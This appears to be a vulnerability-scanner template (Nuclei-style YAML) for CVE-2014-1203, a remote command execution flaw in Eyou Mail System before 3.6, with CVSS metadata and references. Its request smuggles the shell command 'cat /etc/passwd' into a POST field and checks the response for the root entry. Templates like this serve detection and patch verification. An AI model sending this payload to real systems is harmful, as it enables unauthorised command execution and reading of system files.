id: CVE-2014-1203
info:
  name: Eyou E-Mail <3.6 - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: Eyou Mail System before version 3.6 can be exploited by remote attackers
    to execute arbitrary commands via shell metacharacters in the domain parameter
    to admin/domain/ip_login_set/d_ip_login_get.php through the get_login_ip_config_file
    function, as specified in CVE-2014-1203.
  reference:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  - https://nvd.nist.gov/vuln/detail/CVE-2014-1203
  - http://seclists.org/fulldisclosure/2014/Jan/32
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2014-1203
    cwe-id: CWE-77
  tags: seclists,rce,eyou
  metadata:
    impact: The CVE-2014-1203 vulnerability in Eyou Mail System before 3.6 can lead
      to remote code execution, allowing attackers to execute arbitrary commands through
      shell metacharacters in the domain parameter.
    recommendation: It is recommended to immediately update Eyou Mail System to version
      3.6 or higher to prevent remote code execution vulnerabilities like CVE-2014-1203.
requests:
- raw:
  - 'POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    type=''|cat /etc/passwd||''

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
    part: body
  - type: status
    status:
    - 200
